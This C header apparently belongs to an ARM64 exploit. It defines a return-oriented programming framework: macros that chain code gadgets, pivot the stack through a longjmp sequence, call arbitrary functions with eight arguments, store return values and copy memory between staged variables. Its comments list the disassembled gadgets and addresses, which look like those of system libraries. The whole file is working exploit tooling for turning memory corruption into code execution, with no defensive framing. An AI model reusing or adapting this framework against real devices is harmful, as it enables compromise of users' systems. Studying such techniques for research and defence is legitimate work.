#include <stdlib.h>
#include <stdio.h> 
#include <string.h>

#ifndef ROP_H
#define ROP_H
enum ropgadget_types {
	STATIC,
	CODEADDR,
	OFFSET,
	NONE,
	BUF,
	ROP_VAR,
	ROP_LOOP_START,
	ROP_LOOP_END,
	ROP_LOOP_BREAK
};

struct rop_gadget {
	uint64_t value;
	int second_val;
	int type;
	char * comment;
	struct rop_gadget * next;
};
typedef struct rop_gadget rop_gadget_t;

struct rop_var {
	char * name;
	uint64_t size;
	void * buffer;
	uint64_t stage_addr; 
	struct rop_var * next;
};
typedef struct rop_var rop_var_t;

#define ROP_SETUP(offsets) \
	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
	rop_gadget_t * prev = NULL; \
	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
	curr_gadget->next = NULL; \
	curr_gadget->type = NONE; \
	curr_gadget->comment = NULL; \
	(offsets)->stage1_ropchain = curr_gadget; \
	int ropchain_len = 0; 

#define ADD_GADGET() \
	ropchain_len++; \
	if (prev != NULL) { \
		prev = curr_gadget; \
		curr_gadget = malloc(sizeof(rop_gadget_t));\
		curr_gadget->next = NULL; \
		curr_gadget->type = NONE; \
		curr_gadget->comment = NULL; \
		prev->next = curr_gadget; \
	}else{ \
		prev = curr_gadget; \
	}

#define ADD_COMMENT(mycomment) \
	curr_gadget->comment = strdup(mycomment);

#define ADD_LOOP_START(name) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t) strdup(name); \
	curr_gadget->type = ROP_LOOP_START; \
	DEFINE_ROP_VAR(name,8,&curr_gadget); /* using curr_gadget here is dirty... but it works */

#define ADD_LOOP_END() \
	ADD_GADGET(); \
	curr_gadget->type = ROP_LOOP_END;

#define ADD_LOOP_BREAK(name) \
	ADD_GADGET(); \
	curr_gadget->value = strdup(name); \
	curr_gadget->type = ROP_LOOP_BREAK;

#define ADD_CODE_GADGET(addr) \
	ADD_GADGET(); \
	curr_gadget->value = addr; \
	curr_gadget->type = CODEADDR;

#define ADD_STATIC_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = STATIC;

#define ADD_OFFSET_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = OFFSET;

#define ADD_BUFFER(address,size) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t)address; \
	curr_gadget->second_val = size; \
	curr_gadget->type = BUF; 

#define ADD_ROP_VAR_GADGET_W_OFFSET(name,offset) \
	ADD_GADGET(); \
	curr_gadget->value = (uint64_t) strdup(name); \
	curr_gadget->second_val = offset; \
	curr_gadget->type = ROP_VAR; 

#define ADD_ROP_VAR_GADGET(name) ADD_ROP_VAR_GADGET_W_OFFSET(name,0)

#define ADD_REL_OFFSET_GADGET(val) \
	ADD_OFFSET_GADGET((ropchain_len * 8 - 16 + val));

/****** FRAMEWORK ****/

/*
 This is our main gadget now:
		0x1a0478c70      e40316aa       mov x4, x22
		0x1a0478c74      e50314aa       mov x5, x20
		0x1a0478c78      e60315aa       mov x6, x21
		0x1a0478c7c      e70313aa       mov x7, x19
		0x1a0478c80      e0031aaa       mov x0, x26
		0x1a0478c84      e10319aa       mov x1, x25
		0x1a0478c88      e20318aa       mov x2, x24
		0x1a0478c8c      e30317aa       mov x3, x23
		0x1a0478c90      60033fd6       blr x27                    ;[0]
		0x1a0478c94      fd7b47a9       ldp x29, x30, [sp, 0x70]
		0x1a0478c98      f44f46a9       ldp x20, x19, [sp, 0x60]
		0x1a0478c9c      f65745a9       ldp x22, x21, [sp, 0x50]
		0x1a0478ca0      f85f44a9       ldp x24, x23, [sp, 0x40]
		0x1a0478ca4      fa6743a9       ldp x26, x25, [sp, 0x30]
		0x1a0478ca8      fc6f42a9       ldp x28, x27, [sp, 0x20]
		0x1a0478cac      e923416d       ldp d9, d8, [sp, 0x10]
		0x1a0478cb0      ff030291       add sp, sp, 0x80
		0x1a0478cb4      c0035fd6       ret

longjmp:
	   180a817dc	LDP     X19, X20, [X0,#0]	 // x19 will contain the same address as x9 and we don't really want to change that 0x08 of our stack will be loaded into x20
	   180a817e0	LDP     X21, X22, [X0,#16]	 // x21 = our stack 0x10 and x22 = our stack 0x18
	   180a817e4	LDP     X23, X24, [X0,#32]   // x23 = our stack 0x20 and x24 = our stack 0x28
	   180a817e8	LDP     X25, X26, [X0,#48]   // x25 = our stack 0x30 and x26 = our stack 0x38
	   180a817ec	LDP     X27, X28, [X0,#64]   // x27 = our stack 0x40 and x28 = our stack 0x48
	   180a817f0	LDP     X29, X30, [X0,#80]   // x29 = our stack 0x50 and x30 = our stack 0x58
	   180a817f4	LDP     X29, X2, [X0,#96]    // x29 = our stack 0x60 and x2  = our stack 0x68
	   180a817f8	LDP     D8, D9, [X0, #112]   // we can ignore those registers
	   180a817fc	LDP     D10, D11, [X0, #128] //
	   180a81800	LDP     D12, D13, [X0, #144] //
	   180a81804	LDP     D14, D15, [X0, #160] //
	   180a81808	ADD     X31, X2, #0    	     // we pivot using x2 which is loaded from
	   180a8180c	MOV     X0, X1         	     // x0 will now contain the contents of x1 we can't control atm
	   180a81810	CMP     X0, #0         	     // irrelvant
	   180a81814	B.NE    0x180a8181c
	   180a81818	ADD     X0, X0, #1
	   180a8181c    RET                          // pivoted

*/

// we assume we get here with pc pointing to the top of longjump and x0 pointing to the new buffer (which we will create now)
// we will jump over all of the const data and after that have our stack, pc will point to the instruction after the blr x27 of our super gadget
#define INIT_FRAMEWORK(offsets) \
	int ropchain_len = 0; \
	int rop_var_tmp_nr = 0; \
	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
	rop_gadget_t * prev = NULL; \
	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
	curr_gadget->next = NULL; \
	curr_gadget->type = NONE; \
	curr_gadget->comment = NULL; \
	(offsets)->stage3_ropchain = curr_gadget; \
	rop_var_t * curr_rop_var = NULL; \
	rop_var_t * new_rop_var = malloc(sizeof(rop_var_t)); \
	rop_var_t * rop_var_top = new_rop_var; \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x20 */\
	ADD_GADGET(); /* x21 */\
	ADD_GADGET(); /* x22 */\
	ADD_GADGET(); /* x23 */\
	ADD_GADGET(); /* x24 */\
	ADD_GADGET(); /* x25 */\
	ADD_GADGET(); /* x26 */\
	ADD_GADGET(); /* x27 */\
	ADD_GADGET(); /* x28 */\
	ADD_GADGET(); /* x29 */\
	ADD_CODE_GADGET((offsets)->BEAST_GADGET_LOADER); /* x30 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_STATIC_GADGET(((offsets)->stage3_base+(offsets)->stage3_databuffer_len)); /* x2 */ \
	ADD_GADGET(); /* D8 */\
	ADD_GADGET(); /* D9 */\
	ADD_GADGET(); /* D10 */\
	ADD_GADGET(); /* D11 */\
	ADD_GADGET(); /* D12 */\
	ADD_GADGET(); /* D13 */\
	ADD_GADGET(); /* D14 */\
	ADD_GADGET(); /* D15 */\
	ADD_BUFFER((offsets)->stage3_databuffer,((offsets)->stage3_databuffer_len-22*8)); // encount for this longjmp buffer here 
	
// assuming we get here with pc pointing to the loader part of our beast gadget
#define CALL_FUNCTION(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET(addr); /* x27 */ \
	ADD_STATIC_GADGET(arg1); /* x26 */ \
	ADD_STATIC_GADGET(arg2); /* x25 */ \
	ADD_STATIC_GADGET(arg3); /* x24 */ \
	ADD_STATIC_GADGET(arg4); /* x23 */ \
	ADD_STATIC_GADGET(arg5); /* x22 */ \
	ADD_STATIC_GADGET(arg7); /* x21 */ \
	ADD_STATIC_GADGET(arg6); /* x20 */ \
	ADD_STATIC_GADGET(arg8); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET(next_addr); /* x30 */ 

#define CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	CALL_FUNCTION((offsets)->BEAST_GADGET,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);

// there is this gadget: str x0, [x19, #0x28]; ldp x29, x30, [sp, #0x10]; ldp x20, x19, [sp], #0x20; ret; 
// we will use this to str x0 somewhere (cause we get x19 control from the gadget above)
// Because we use a second call gadget we will jump back to the gadget abve to load the registers again/for the next func call
#define CALL_FUNC_WITH_RET_SAVE(where,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_GADGET(); /* x27 */ \
	ADD_GADGET(); /* x26 */ \
	ADD_GADGET(); /* x25 */ \
	ADD_GADGET(); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_STATIC_GADGET((where-(offsets)->str_x0_gadget_offset)); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define DEFINE_ROP_VAR(varname,varsize,buf) \
	if (curr_rop_var != NULL) { \
		new_rop_var = malloc(sizeof(rop_var_t)); \
		if (new_rop_var == NULL) {printf("malloc\n");exit(-1);} \
		curr_rop_var->next = new_rop_var; \
	} \
	new_rop_var->name = strdup(varname); \
	new_rop_var->size = varsize; \
	new_rop_var->buffer = (void*)buf;\
	new_rop_var->next = NULL; \
	curr_rop_var = new_rop_var; 

#define SET_ROP_VAR64_W_OFFSET(name,value,offset) \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_STATIC_GADGET(value); /* x23 (the offset is pointing here) */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define SET_ROP_VAR64(name,value) SET_ROP_VAR64_W_OFFSET(name,value,0)

#define SET_ROP_VAR64_TO_VAR_W_OFFSET(name,offset1,other_name,offset2) \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset1); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(other_name,offset2); /* x23 (the offset is pointing here) */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define ROP_VAR_CPY_W_OFFSET(name,offset1,other_name,offset2,size) \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset1); /* x26 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(other_name,offset2); /* x25 */ \
	ADD_STATIC_GADGET(size); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define ROP_VAR_CPY(name,other_name,size) ROP_VAR_CPY_W_OFFSET(name,0,other_name,0,size)

#define CALL_FUNC_RET_SAVE_VAR(name,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_GADGET(); /* x27 */ \
	ADD_GADGET(); /* x26 */ \
	ADD_GADGET(); /* x25 */ \
	ADD_GADGET(); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name, ((offsets)->str_x0_gadget_offset)); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 


// this is here to set the arg of a func call to a pointer to our rop var
// it will call memcpy and then copy the address of our gadget over the argument in the next function call (9*8 to get to the next function 7*8 to get to the args and then nr*8 to get to the arg)
// but the 7th arg is acc at the 6th position and vice versa so we have to account for that
// this is super dirty...
// FIXME: there must be a better way to do this...
#define ROP_VAR_ARG_W_OFFSET(name,nr,offset) \
	rop_var_tmp_nr = nr; \
	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8  */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8)); /* x26 */ \
	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x23 (the offset is pointing here) */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#define ROP_VAR_ARG(name,nr) ROP_VAR_ARG_W_OFFSET(name,nr,0)

// same as above but it doesn't copy the pointer but a uint64_t value
#define ROP_VAR_ARG64(name,nr) \
	rop_var_tmp_nr = nr; \
	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
	ADD_GADGET(); \
	ADD_GADGET(); \
	ADD_GADGET(); /* d9 */ \
	ADD_GADGET(); /* d8 */ \
	ADD_GADGET(); /* x28 */ \
	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8)); /* x26 */ \
	ADD_ROP_VAR_GADGET(name); /* x25 */ \
	ADD_STATIC_GADGET(8); /* x24 */ \
	ADD_GADGET(); /* x23 */ \
	ADD_GADGET(); /* x22 */ \
	ADD_GADGET(); /* x21 */ \
	ADD_GADGET(); /* x20 */ \
	ADD_GADGET(); /* x19 */ \
	ADD_GADGET(); /* x29 */ \
	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 

#endif
